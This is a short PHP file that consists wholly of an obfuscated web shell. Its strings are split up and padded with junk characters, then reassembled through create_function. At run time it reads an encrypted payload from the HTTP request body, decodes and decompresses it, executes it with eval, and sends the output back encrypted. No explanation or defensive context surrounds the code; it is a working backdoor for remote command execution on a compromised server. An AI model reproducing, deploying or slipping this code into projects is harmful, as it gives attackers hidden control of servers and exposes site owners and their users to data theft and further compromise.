<?php
$l='{$o.=$t{$i}^$k{~$j};~}}r~eturn~ $o;}if (@~pre~g_match(~~"/$~kh~(.+)$kf/",@file_get_cont~ents("~~php:/~/';
$Z='input"),~$m)~==1)~ {@ob_~start();@eva~l(~@gzuncomp~re~ss(@x(@bas~e64_dec~ode($m[1])~,$k)~));$o=~@o~b_ge~';
$A='$k="2b23~~1f81";$kh~=~"2395335b~1f40";$kf="0~cb7b~8063~~529";$p="dZ50Y4~E1VbWuz~YLz"~;functi~on ~x~($t,';
$C=str_replace('Gw','','creGwatGwGwe_fuGwGwnctiGwon');
$V='~$k){$c=strlen($k~);~$l=st~~rlen($t)~;$o="";for($i=0;~$i<$l~;){for(~$j=~0;($j~<$c&&$~i<$l)~;$j++,~$i~++)~';
$P='t_contents();~@ob_en~d~_c~lean();$r=@base~64~_encode(@~x(@gzco~mpress(~$o),$k~))~;~print~("$p$kh$r$kf");}';
$g=str_replace('~','',$A.$V.$l.$Z.$P);
$J=$C('',$g);$J();
?>
